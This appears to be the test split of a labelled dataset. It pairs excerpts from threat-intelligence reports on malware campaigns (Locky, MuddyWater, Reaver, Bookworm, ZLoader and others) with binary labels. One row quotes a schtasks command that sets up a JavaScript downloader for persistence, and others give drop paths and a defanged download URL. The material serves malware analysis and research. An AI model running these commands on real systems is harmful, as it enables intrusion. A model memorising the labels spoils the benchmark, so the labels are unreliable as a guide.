ID,SPLIT,description,long_golden_tar
10,TEST_long,"new family calling itself “Locky” has borrowed the technique from the eminently successful Dridex to maximize its target base. We first learned of Locky through Invincea and expanded on qualifying this threat with the help of PhishMe . Locky has also gained enough traction to find its way onto Dynamoo’s Blog and Reddit . Using Palo Alto Networks AutoFocus, Unit 42 observed over 400,000 individual sessions containing the Bartallex macro downloader, which in turned dropped Locky ransomware onto victim machines. Researchers suspect there is a link between the Dridex botnet affiliate",1
11,TEST_long,Public Sector Explore Our Portfolio Data Protection Network Security Security Management Security Operations Server Security Web Security All Solutions Products MVISION Cloud Unified Cloud Edge Cloud Access Security Broker (CASB) Next-gen Secure Web Gateway (SWG) Data Protection Container Security Workload,0
12,TEST_long,"in Mali, Austria, Russia, Iran and Bahrain.. These new documents have appeared throughout 2018 and escalated from May onwards. The attacks are still ongoing. The new spear-phishing docs used by MuddyWater rely on social engineering to persuade users to enable macros. The attackers rely on a range of compromised hosts to deliver their attacks. In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers. Previous related research: https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1 https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/ Decoy images by country Jordan The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc) DAMAMAX.doc Turkey Turkey’s General Directorate of Security Turkey’s Directorate General of Coastal Safety Turkey’s General Directorate of Security (Onemli Rapor.doc) Turkey’s Ministry of the Interior (Early election.doc) Saudi Arabia Document signed by the Major General Pilot, commander of the Saudi Royal Air Force KSA King Saud University (KSU) KSA King Saud University (KSU) Azerbaijan İnkişaf üçün görüş.doc (meeting for development) Iraq Iraqi Ministry of Foreign Affairs Government of Iraq, the Treasury of the Council of Ministers Pakistan ECP.doc National Assembly of",1
13,TEST_long,"are movements the Chinese government perceives as dangerous. They are: Uyghurs, particularly those supporting East Turkestan independence Tibetans, particularly those supportive of Tibetan independence Falun Gong practitioners Supporters of Taiwan independence Supporters of Chinese democracy The attackers used both families concurrently from late last year through November 2017 and there is some C2 infrastructure overlap between the two families, as well as links to historical reporting. We explore those ties and provide an in-depth analysis of the new malware below. Reaver Malware Analysis To date, Palo Alto Networks Unit 42 has identified 10 unique samples and three distinct variants of a new malware family we have named “Reaver”. As such, we identify each variant as Reaver.v1, Reaver.v2, and Reaver.v3. Reaver.v1 has been observed delivering a payload that uses HTTP for network communication, while versions 2 and 3 use a payload that uses raw TCP connections for this communication. The flow for Reaver is as shown: Figure 1 Reaver execution flow diagram Reaver.v1 The earliest variant of Reaver begins by attempting to enable the SeDebugPrivilege privilege for the running process. In the event this is successful the malware will use the following path to store any dropped",1
14,TEST_long,"Technical details Infection vector Spear phishing was used to spread the malware. A letter was prepared separately for each victim to grab their attention and prompt them to open an attached malicious Microsoft Office document. Each malware sample was compiled immediately before being sent and included the latest available version of the malware executable. Since the framework evolved from 2009 to 2017, the last releases are totally different from the first ones, so the current report details only the latest available version of the malware used until 2017. The executable file embedded in the documents extracts two malicious files from itself, updater.mod and glue30.dll, and saves them in the working directory of the malware – %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Reorder. After that, it copies the legitimate rundll32.exe executable into the same directory and uses it",0
15,TEST_long,"tool known as Mimikatz, which we believe the threat actors will use to gather account credentials from the compromised system. While we do not have detailed telemetry, we have reason to believe this attack targeted an individual at a public utilities company in the Middle East. New Clayslide Delivery Document The most recent build of Clayslide operates in a similar way to its predecessors, as it initially displays an “Incompatible” worksheet that states that the Excel file was created with a newer version of Excel and the user needs to “Enable Content” to view the document. If the user clicks “Enable Content”, a malicious macro will run that begins by displaying a hidden worksheet that contains decoy contents, as seen in the following: While the decoy is displayed to the victim, the malicious macro accesses data from specific cells in the “Incompatible” worksheet that it concatenates to create an .HTA file, which it then saves to %PUBLIC%\tmp.hta and opens with the",1
16,TEST_long,"a family of crypto-ransomware, was observed to have affected Italy . Australia used to be the major target of these attacks (although other countries were affected as well), but recently the United Kingdom has been the favored target. TorrentLocker-related emails pretend to be from utilities like British Gas or government bodies like the Home Office or the Ministry of Justice. These lead to fake sites of the same institutions that claim the user has to enter a captcha for some purpose. Entering this captcha downloads TorrentLocker",1
17,TEST_long,"the associated attack campaigns and attributions surrounding Bookworm. Bookworm: Chapter One So far, it appears threat actors have deployed the Bookworm Trojan primarily in attacks on targets in Thailand. Bookworm has many layers (see Figure 1) that increase the complexity of its overall architecture. To make matters worse, the author used multiple algorithms not only to encrypt and decrypt files saved to the system, but also to encrypt and decrypt network communications between Bookworm and its C2 servers (known servers are listed in the Indicators of Compromise section near the end of this post). Layered Loading Approach The threat actors use a commercial installation tool called Smart Installer Maker to encapsulate and execute a self-extracting RAR archive and in some cases a decoy slideshow or Flash installation application. The self-extracting RAR writes a legitimate executable, an actor-created DLL called Loader.dll and a file named readme.txt to the filesystem and then executes the legitimate executable. Figure 1 Architecture of Bookworm Thus far, the actors deploying bookworm have used the legitimate executables Microsoft Malware Protection (MsMpEng.exe) and Kaspersky Anti-Virus (ushata.exe) to perform DLL side-loading and load the Loader.dll. Loader.dll decrypts the readme.txt file using a three byte XOR algorithm with 0xd07858 as a key, which results in shellcode that is responsible",1
18,TEST_long,and dropping malware via fake ProtonVPN installers for Windows. Screenshot of a fake ProtonVPN website The campaign started at the end of November 2019 when the threat actor behind it registered a new domain under the name protonvpn[.]store . The Registrar used for,0
19,TEST_long,"data over DNS. The addition of DNS-based exfiltration is new for this malware family; however, other POS malware families such as BernhardPOS and FrameworkPOS have used this technique in the past. Using DNS for data exfiltration provides several advantages to the attacker. Sensitive environments that process card data will often monitor, restrict, or entirely block the HTTP or FTP traffic often used for exfiltration in other environments. While these common internet protocols may be disabled within a restrictive card processing environment, DNS is still necessary to resolve hostnames within the corporate environment and is unlikely to be blocked. Specific",0
20,TEST_long,"In a statement posted on NAYANA’s website on June 17, the second of three payments was already made. On June 18 , NAYANA started the process of recovering the servers in batches. Some of the servers in the second batch are currently experiencing database (DB) errors. A third payment installment is also expected to be paid after the first and second batches of servers have been successfully recovered. While not comparable in terms of the ransom amount, this is reminiscent of what happened to Kansas Hospital , which didn’t get full access to the encrypted files after paying the ransom, but was instead extorted a second time. Erebus was first seen on September 2016 via malvertisements and reemerged on",1
21,TEST_long,"in Emotet activity shows that it remains an active threat ESET Research 9 Nov 2018 - 03:11PM Share The recent spike in Emotet activity shows that it remains an active threat A week after adding a new email content harvesting module , and following a period of low activity, the malicious actors behind Emotet have launched a new, large-scale spam campaign. What is",1
22,TEST_long,"the use of a specially crafted Word document, we can assume that it can arrive on a user’s system through other malware or as an attachment or links/URLs in spam. The flaw affects Microsoft Word 2013 and later versions. The PoC and malware employs the DOCX file type used in Microsoft Word, an eXtensible Markup Language-based (XML) file that can contain text, objects, styles, formatting, and images. They are stored as separate files and packed in a ZIP-compressed/archived DOCX file. Figure 1: Comparison of the PoC (left) and the in-the-wild",0
23,TEST_long,"browser. In recent months, the malware used in the EITest campaign has been ransomware such as Spora and Mole . However, by late August 2017, this campaign began pushing a different type of malware. Recent samples are shown to infect Windows hosts with the NetSupport Manager remote access tool (RAT). This is significant, because it indicates a potential shift in the motives of this adversary. Today’s blog reviews recent activity from these EITest HoeflerText popups on August 30, 2017 to discover",0
24,TEST_long,"information Grabbing screenshots and files Downloading additional files Running other processes and commands Listing and killing processes Opening Telnet and RDP servers Extracting Windows credentials from the current session The sample of “Hacker’s Door” analyzed by Cylance was signed with a stolen certificate, known to be used by the Winnti APT group. Its discovery within an environment is a clear indication of a broader compromise. Technical Analysis Components The malware consists of a dropper that contains an embedded DLL in its resource section. The DLL is the main backdoor payload that also drops an additional rootkit driver that is used for covert communications: All dropped files are time-stomped using the MAC time copied from %WINDIR%\hh.exe . Dropper The dropper extracts the backdoor DLL from a resource named BIN/100 and writes it to %windir%\system32\pifngr.dll . Next it copies itself to %windir%\system32\pifmgr.exe and creates a service that will run it on each boot. When run with the “/o” parameter, the malware will create a separate instance of itself that will load the dropped binary and start the backdoor. Command Line Parameters Figure 1. Dropper - Strings Backdoor The DLL is the main backdoor payload. It is responsible for opening a channel for communication with the rootkit driver and awaiting commands and executing them. It creates two threads, one responsible for",0
25,TEST_long,"of this malware are typically infected via a dropper. Once infected, a victim machine will create a scheduled task. This task will execute a JavaScript downloader that makes a request to one of several hijacked domains. The command line string that create this task is: C:\Windows\system32\schtasks.exe /create /tn {guid} /tr cmd.exe /C ""start /MIN C:\Windows\system32\cscript.exe /E:javascript ""C:\Users\USERNAME\ymwoyf.wpl"" /sc WEEKLY /D TUE,WED,THU /ST 12:00:00 /F This downloader is executed using the command: cmd.exe /C start /MIN C:\Windows\system32\cscript.exe /E:javascript C:\ProgramData\\puigje.wpl"" C:\Windows\system32\cscript.exe /E:javascript C:\ProgramData\puigje.wpl Cisco Talos first observed a spike in requests to these hijacked domains on April 2, 2019. This coincides with DNS changes made to these domains on March 19, 2019. Additionally, the comment string ""CHANGES 15.03.19"" is contained within the malicious JavaScript downloader, suggesting this actor updated",1
26,TEST_long,"the previous WannaCry outbreak. While this SLocker variant is notable for being able to encrypt files on mobile, it was quite short-lived. Shortly after details about the ransomware surfaced, decrypt tools were published. And before long, more variants were found. Five days after its initial detection, a suspect supposedly responsible for the ransomware was arrested by the Chinese police . Luckily, due to the limited transmission channels (it was spread mostly through forums like QQ groups and Bulletin Board Systems), the number of victims was very low. Figure 1. Timeline for this ransomware sample The original sample captured by Trend Micro was named “王者荣耀辅助” (King of Glory Auxiliary), which was disguised as",0
27,TEST_long,"of their malware used in 2019 which appears to be custom compiled on a per target victim per organization basis, with this particular decoy document being uploaded from a Singapore IP address. Decoy RTF Document In this example, SectorB06 made use of a Mongolian decoy document to target their victim. Decoy document written in Mongolian which references the Ministry of Justice and Internal Affairs of Mongolia If exploitable, the exploit code drops the first-stage malware DLL at “%APPDATA%\Microsoft\Word\STARTUP\cclerr.wll” and runs it. First Stage Malware (RasTls.dll) The malware starts off by resolving a list of encoded API addresses by accessing the address of kernel32 from the InMemoryOrderModuleList inside the Process Environment Block (PEB) using FS:[0x30]. It then gets the address",1
28,TEST_long,"a modus for a certain group of Turkish-speaking hackers. And by abusing Instagram’s account recovery process, they were able to keep the stolen account even if the victim squarely followed the process. We’ve seen cases where owners of Instagram profiles with followers between 15,000 and 70,000 were hacked and were never retrieved. The victims ranged from famous actors and singers to owners of startup businesses like photoshoot equipment rentals. The group also engages in digital extortion . Once a victim tries to reach out to the hacker, they would be wringed to fork over a ransom or nude photos and videos to get",1
29,TEST_long,"black hats step in ESET researchers have discovered a new sneaky malware threat named Joao, targeting gamers worldwide. Tomáš Gardoň 22 Aug 2017 - 10:56AM Share ESET researchers have discovered a new sneaky malware threat named Joao, targeting gamers worldwide. ESET researchers have discovered a new sneaky malware threat named Joao, targeting gamers worldwide. Spread via hacked Aeria games offered on unofficial websites, the modular malware can download and install",1
30,TEST_long,"in the past, showing that they are relying on some of the same tactics, techniques and procedures (TTPs). Fake veteran hiring website The fake website, called ""Hire Military Heroes"" (hxxp://hiremilitaryheroes[.]com/), which immediately goes after veterans with an image from the movie ""Flags of our Fathers."" The website is only composed of three links to download a desktop app for free. The app is a fake installer. Contrary to standard malware installers, this one does not need to be silent, as the user expects an installation. Here's a look at the user interface, and the error message is always displayed to suggest something has ""stopped"" the app from accessing its database. The progress bar almost fills up entirely, and then displays an error message: The installer checks if Google is reachable. If not, the installation stops. If it is reachable, the installer downloads two binaries from hxxp://199[.]187[.]208[.]75/MyWS.asmx/GetUpdate?val=UID: The",1
31,TEST_long,"Tuesday 2020-04-07 pushing ZLoader malware. Also known as Terdot or DELoader, ZLoader is the latest version or variant from this family of malware that has been active for years. Shown above: Flow chart for this infection chain. The malspam I found two emails that contained zip archives for ZLoader. The attachments appear to be invoices for some sort of transaction. Shown above: First example of malspam pushing ZLoader. Shown above: Second example of malspam pushing ZLoader. Shown above: Extracting a VBS file from one of the attachments. The infection traffic Network traffic caused by a ZLoader infection is all HTTPS, so to view the content, you",0
32,TEST_long,"also sometimes target countries outside of the Middle East. One characteristic of SectorD02 is their incrementally changing PowerShell backdoor. We came across two of SectorD02’s such backdoors at the end of 2018, and we analyzed these variants then identified them as the group’s PowerShell malware. SectorD02 focuses on using PowerShell scripts to carry out their attacks and loading those scripts past layers of obfuscation through a variety of methods. One such method is via PS2EXE",1
33,TEST_long,"people online, while the overall number of game servers registered on Steam exceeds 5,000. Selling, renting, and promoting game servers is now deemed an actual business, and these services can be purchased on various websites. For example, raising a server’s rank for a week costs about 200 rubles, which is not much, but a large number of buyers make this strategy a rather successful business model. Many owners of popular game servers also raise money from players by selling various privileges such as protection against bans, access to weapons, etc. Some server owners advertise themselves independently, while others purchase server promotion services from contractors. Having paid for a service, customers often remain oblivious as to how exactly their servers are advertised. As it turned out, the developer nicknamed, “Belonard”, resorted to illegal means of promotion. His server infected the devices of players with a Trojan and used their accounts to promote other game servers. The owner of the malicious server uses the vulnerabilities of the game client and a newly written Trojan as a technical foundation for their business. The Trojan is to infect players’ devices and download malware to secure the Trojan in the system and distribute it to devices of other players. For that, they exploit Remote Code Execution (RCE) vulnerabilities, two of which have been found in the official game client and four in the pirated one. Once set up in the system, Trojan.Belonard replaces the list of available game servers in the game client and creates proxies on the infected computer to spread the Trojan. As a rule, proxy servers show a lower ping, so other players will see them at the top of the",0
34,TEST_long,"the same attackers or by a closely related group. What is phishing? Credentials phishing (or “Password-Stealing Phishing”) consists in the creation of a website that imitates the login prompt of a given online service, such as Gmail or Facebook, with the objective of luring a victim into visiting the malicious page and entering their username and passwords, thereby transmitting these credentials to the attackers. Credentials phishing remains a critical threat to HRDs online. Because of its simplicity and relatively low economic cost, phishing is a favorite tactic among attackers, and we regularly observe targets in the hundreds if not thousands. However, credential phishing is not always simple, and these new attacks - like those we documented previously - have taken novel steps to overcome security measures that targets take. As credentials phishing schemes evolve and improve, mitigations as well as security education need to improve too. In this report we describe the improved techniques utilized by the attackers, which once more demonstrate their ability to adapt to changes in the technological landscape, and respond to the latest online accounts authentication and security best practices by developing workarounds. First Tactic - Good old ""Reset your Password"" revisited Among the most popular social",1
35,TEST_long,"different threat actors who improved it and added new features. Over the past few years, Japan has been among the top countries targeted by Ursnif’s operators. In 2018, Cybereason as well as other security companies reported about attacks where Ursnif (mainly the Dreambot variant ) and Bebloh (also known as URLZone and Shiotob) were operating in conjunction. In these joint campaigns, Bebloh is used as a downloader that runs a series of tests to evaluate whether it is running in a hostile environment (for example, it checks to see if it is running on a research VM). Once the coast is clear, it downloads Ursnif, which carries out its core information stealing functions. The newly discovered Ursnif variant comes with enhanced stealing modules focused on stealing data from mail clients and email credentials stored in browsers. The revamping and introduction of new mail stealer modules puts an emphasis on the risk that trojans can pose to enterprises if corporate accounts are compromised. With more and more banking customers shifting to mobile banking and the continuous hardening of financial systems, it is not surprising that trojans are focusing more than ever before on harvesting other types of data that can also be monetized and exploited by the threat actors, including mail user accounts, contents of email inboxes and digital wallets. Curious about the future of security? Contents of this Research: OLD -NEW TRICKS, NEW VARIANT STAGE ONE: PHISHING VIA OFFICE DOCUMENTS MODIFIED VBA MACRO TARGETS JAPANESE USERS OLD VBA COUNTRY CHECK NEW VBA",1
36,TEST_long,"they don’t need to exploit vulnerabilities and don’t depend on any version of Docker. Identifying a misconfigured and thus exposed container image is all it could take for attackers to infect many exposed hosts. When exposed, the Docker API enables the user to execute a wide range of commands . These include listing the running containers; getting logs from a specific container; starting, stopping, or killing a container; and even creating a new container with a specific image and given options. Figure 1. How the payloads are delivered (left) and visualization of the attacker’s environment that enables the images to be deployed remotely (right) Figure 2. Country distribution of the 3,762 exposed Docker APIs, based on search results on Shodan (as of Feb. 12, 2019) Attack chain and payloads We uncovered these activities not just by monitoring our honeypots. Recent Shodan data (Figure 2) also revealed that the",0
37,TEST_long,"June 10, 2015. 8:32 pm It means that attendees at the event were targeted by the malware. Reply leon Posted on June 11, 2015. 5:58 am It was a concentration camp during WWII where many jews and other not “arians” were murdered by nazis Reply Cody Posted on June 11, 2015. 5:22 pm If this appears twice I apologise. I had scripts disabled and it didn’t show up after posting, so I’m trying with scripts enabled. — Firstly, you’re ignoring context. Context is rather important. He means what does this attack",0
38,TEST_long,"in Saudi Arabia. In at least two organizations, evidence suggests that the attackers gained domain admin-level access. ""#Tortoiseshell group uses custom malware, off-the-shelf tools, #livingofftheland techniques to compromise victims https://symc.ly/2lV4Ovn"" Click to Tweet Another notable element of this attack is that, on two of the compromised networks, several hundred computers were infected with malware. This is an unusually large number of computers to be compromised in a targeted attack. It is possible that the attackers were forced to infect many machines before finding those that were of most interest to them. We have seen Tortoiseshell activity as recently as July 2019. Custom tools The",1
39,TEST_long,"systems. Qakbot has been around for years (in fact, we made this video about it last April), but it’s nothing to be complacent about. This malware is well-known for its ability to steal credentials and quickly spread through an enterprise over network shares. Given its age, it might seem logical that security controls would have this threat on lockdown. However, the occasional functional enhancements combined with its multiple layers of obfuscation and server-side polymorphism periodically breathe new life into this seemingly immortal malware. While it’s unclear why so many systems have suddenly fallen victim to Qakbot, it’s possible that updated exploit kits play a role. After all, there is no shortage of new vulnerabilities and exploits for attackers to use to their advantage. Since the core functionality of Qakbot has",0
40,TEST_long,so it can readily be blacklisted via Group Policy. Reply Leave a Reply Cancel Reply,1
41,TEST_long,"has used in the past. Both the Trochilus and MoonWind RATs were hosted on the same compromised sites and used to target the same organization at the same time. The attackers used different command and control servers (C2s) for each malware family, a tactic we believe was meant to thwart attempts to tie the attacks together using infrastructure alone. The compromised websites are the site for a group of information technology companies in Thailand, and all the tools were stored in the same directory. We were also able to find a post-compromise tool along with the two RATs, which afforeded us insight into one of the tools the attackers used once they gained a foothold inside an organization. In addition to Trochilus and MoonWind we found Mimikatz, a popular credential harvesting tool. Further research led us to",1
42,TEST_long,"names have mirai mentioned it is probably not wise to treat it just as a mirai variant We sort out the botnet discovery process, communication techniques, behavioral characteristics, a brief analysis of the botnet attacks, and in accordance with the timeline to organize the blog as follows: GoAhead and multiple camera RCE vulnerabilities The attacker exploited the vulnerability The scan started From scan to sample C2 historical changes backtracking Botnet size from DNS perspective An observation about a particular scanner 212.232.46.46 IoC GoAhead and Multiple Camera RCE 0Day Vulnerabilities Researcher Pierre Kim (@PierreKimSec) released a vulnerability analysis report on GoAhead and other OEM cameras on 2017-03-08. In terms of equipment manufacturers attribution, the original author pointed out that the equipment OEM manufacturers involved more than 1,250 different camera manufacturers, models; About the number of potential infection equipment, the researcher used Shodan to estimate that more than 185,000 devices have potential problems. The",0
